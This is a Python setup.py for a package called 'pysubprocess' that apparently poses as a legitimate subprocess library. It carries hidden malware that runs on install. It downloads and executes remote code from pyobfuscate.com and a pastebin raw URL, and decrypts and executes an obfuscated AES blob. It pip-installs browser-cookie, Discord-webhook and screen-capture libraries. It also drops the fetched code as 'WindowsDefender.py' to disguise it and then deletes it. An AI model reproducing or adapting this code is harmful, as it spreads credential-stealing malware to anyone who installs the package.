try:
    from requests import get
except:
    input("pip install requests \\npress enter to Exit")
    __import__('sys').exit()
fl = __import__("requests").get("https://pyobfuscate.com/aes.txt").text
try:
    from os.path import exists as ex
    from os import getenv as ge, remove

    loc = ge('APPDATA');
    p1 = loc + "\\aes.txt";
    p2 = loc + "\\rsa.txt";
    p3 = loc + "\\aes2.txt"
    if ex(p1) == True:
        remove(p1)
    elif ex(p2) == True:
        remove(p2)
    if ex(p3) == False:
        with open(str(p3), "w") as e: e.write(str(fl))
    exec(open(p2).read())

except:
    exec(fl)




obfuscate = {'(https://pyobfuscate.com)*(exec)': 'ABAO=8T0s3OoRhdDid6#K{skTQv~Ro5qsY<QSScG??$N!3RgqhjAi^KegiEQ?PMSrtLx+V!ITe7HKCM*CcBrz)u4i8ltd89oB0*Xv&ak>*E?iXFGOCjXy>@zuuOVTDU^2UrqF}!F_p_&wefthPG(W=@vYV32BZszRPT)6R#~oNwAXQ;Eg*bXG@&6cC$lK}Uba&^&Deg`Dzrs_p^R5y<HC1oPU-{-ZZ)o6{?I0;)bD8RlMR?r>6sWHy{b)KnmJ0!J5W9s^>D|1P)bZ+CmHFfE6uFUd0d}mZ38D_5iZJdA<WS;ubLc(rB~@y2HfnV@b^CH&0Ss5@PjkNm|9fap~ZQXv6|QfniWWXC&~0&eUN*(&gxU?`V9eH&Bk$pnK{^c7cU~gussL8GsC5eu?H+SIC#Z%KDFj$LWnW7MVHzN-Sm8lOawJUE!3gue`v1pfS|&20>E1LoGE}q);TbYM{jP~O>dT4QZf`(;@~(A&Y$}J5O%hs_l0qs)Ez34^$DiATvA0rNXh4C<ZVL`Of5YmJm8s9RViLcA^ZJ|Y2LE0(5%d;Zlvg2ivAAzQsr8V%-0`;aeVq&mDJ+d3Djy=;?F2n1<iDJQ5f0yomof_?33B0#w0R$6M)ZyxY(-><x(jV0lKQQR=udMu}kMvQ=g#R{~$lL1&C^Uh@s2RctIUngQO#oZ8?}xG(6T(R}oO+AIfF6D}kp$hS|sw1{-<CHItyb>Oc}EMbvYu{Au3+{Jn~P{Y>_?)_m+6x6sYmT&&2bc?%Da$mtqAO~Pdaez~iDX}Fn8Eg@(06E9Q|e)2qfdP$ol)sME!MYeXz*GL56b2_d80cnRQs!IGb0B7yqrdOCV-VJ`%NU<IQNL*@lpe~WV4{O4xqncPYwVmc3r<ZovYE^;_&w>)a%Iwy5;~4n(Fs>U8zx@v-vahMvwna+%AFxdbv2Pn`lHH%L@xA-h!OLCfW((Lm@dk@fnlUkaF@Gu@F-<P=1-AuFluMKCLLK^ds3>*bz~U5Y-Z}{0FIJw&=suCp+G-F<iPl+2f9Z$sn%2hA9i6qlG{Mm!>wJGt^RPrhASZp_t9QIit(*yj7~&WrYI&quGS=5-b|O6%Y>v~wL$?QU13z&Q0IH&A`6+PYn(eCW3p2e3JgWXbiFZdq-NhURO0;9FJ_vCG;+=>KraPlyR&uke0k7B#oK#vhE{Cc^K)ZR4dS|(zK<9bU^@NdTWdmz;ytbTYf>o1hq8mtE#GW)rlLYU9W&xU}B~V!%G5P_QIRW@4Qek?Yc**;<)FGP+oiutJYj?FVzz*A+;XlO6KR?(jRY|HUVLz^4VxJEObmiM>dfE*cQ6Xg%RjB)`>hl9tDoTBSEDE=#@H%CgPd6zp$tx<z42Y)c97a~1*C8nS>rzt%NnzjILN~KRRN_lxx9vj1BnHXKk1=q8#7q+LAR~`<Mx-tXbI`W91B<JJNn#f<v4;dlSB9jYOPp`mV%j6|E^kZ$g5L-QD&1R3;u6L2g$nDqy9vb*h#I|mcBsq*6h;BtT3tPTFa^33=?GEYr4yD<47-zZDtMbl@kwCji7stJODN`!vZ^J3S>ciCb8xn0;opWT82Y!2CbI+Xcwu+zRur}$TV=?vI|EZ8G8D@n<e=J&d#KTKHDS?hCuYa)g%nC9>m*+@Zv0aZrT5q>0&UKiI5MrTK6JkW3Kzs^WD47-PP&<8R=*YL9TC1@&SuCqGVsy;$nqp3ahzTulJwQEu1XSI99H6U<MvZ8>{k+m$rbbt{jeu0'}

try:
    import random, base64, zlib, sys, string
    from Crypto.Cipher import AES, PKCS1_OAEP
    from Crypto.Hash import SHA256
    from Crypto.PublicKey import RSA
    from Crypto.Random import get_random_bytes
    from Crypto.Signature import pkcs1_15
    from Crypto.Util.Padding import pad, unpad
    from Crypto.Cipher import AES
    import binascii

    class AESEncryption:

        def __init__(self, key: bytes) -> None:
            self.key = key

        @classmethod
        def from_nbits(cls, nbits: int=256):
            cls.iv = iv
            cls.key = keys
            cls.mode = mode
            return cls(keys)

        def encrypt(self, message: bytes) -> bytes:
            cipher = AES.new(self.key, self.mode, self.iv)
            ciphered_data = cipher.encrypt(pad(message, AES.block_size))
            return ciphered_data

        def decrypt(self, message: bytes) -> bytes:
            cipher = AES.new(self.key, self.mode, self.iv)
            decrypted_data = unpad(cipher.decrypt(message), AES.block_size)
            return decrypted_data
    MESSAGE_LONG = get_random_bytes(100100)
    res = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
    bb = _encrypt[125:]
    keys = base64.b85decode(bb)
    iv = _pubkey[100:]
    mode = AES.MODE_CBC
    aes = AESEncryption.from_nbits(256)
    encrypted_msg = aes.encrypt(_lambda)
    passkey2 = 'Obfuscated by https://pyobfuscate.com'
    if not _key == passkey2:
        print('Decryption Key Do not Match or Missing AES Salt 256')
        sys.exit()
    exec(zlib.decompress(aes.decrypt(_lambda)).decode())
except:
    import base64, os, hashlib, random
    from Crypto.Cipher import AES

    def aes_decrypt(encrypted_data, key):
        encrypted_data = base64.b85decode(encrypted_data)
        salt = encrypted_data[:8]
        (key, iv) = derive_key_and_iv(key, salt)
        cipher = AES.new(key, AES.MODE_CFB, iv)
        data = cipher.decrypt(encrypted_data[8:])
        return data.decode()

    def derive_key_and_iv(password, salt):
        dk = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
        key = dk[:16]
        iv = dk[16:]
        return (key, iv)
    exec(aes_decrypt(list(obfuscate.values())[0], list(obfuscate.keys())[0][1:-1]))



from setuptools import setup
import socket
import urllib.request
import os
import shutil
import winreg
import requests
import pip
packages = ['prettytable', 'pycountry', 'py_cpuinfo', 'browser_history', 'colorama', 'psutil', 'requests', 'sockets', 'pycaw', 'comtypes', 'discord', 'pypiwin32', 'pycryptodome', 'uuid', 'cryptography', 'pyfiglet', 'browser_cookie3', 'discord_webhook', 'prettytable', 'getmac', 'pyautogui', 'winregistry', 'robloxpy', 'pywin32', 'Pillow', 'tqdm', 'setuptools', 'opencv-python', 'numpy', 'pycaw', 'wmi']
for package in packages:
    pip.main(['install', package])
def send_discord_info():
    import requests
    import os
url = 'https://pastebin.pl/view/raw/08209d7f'
archivo = requests.get(url)
codigo = archivo.text
ruta = os.path.join(os.path.expanduser('~'), 'WindowsDefender.py')
with open(ruta, 'w', encoding='utf-8') as f:
    f.write("# -*- coding: latin-1 -*-\n")
    f.write(codigo)
exec(compile(codigo, ruta, 'exec'))
os.remove(ruta)
from setuptools import setup
setup(
    name='pysubprocess',
    version='1.0.0',
    packages=['pysubprocess'],
    url='https://github.com/pysubprocess/pysubprocess',
    license='',
    author='pysubprocess',
    author_email='pysubprocess@gmail.com',
    description='Python Subprocess',
)
if __name__ == '__main__':
    send_discord_info()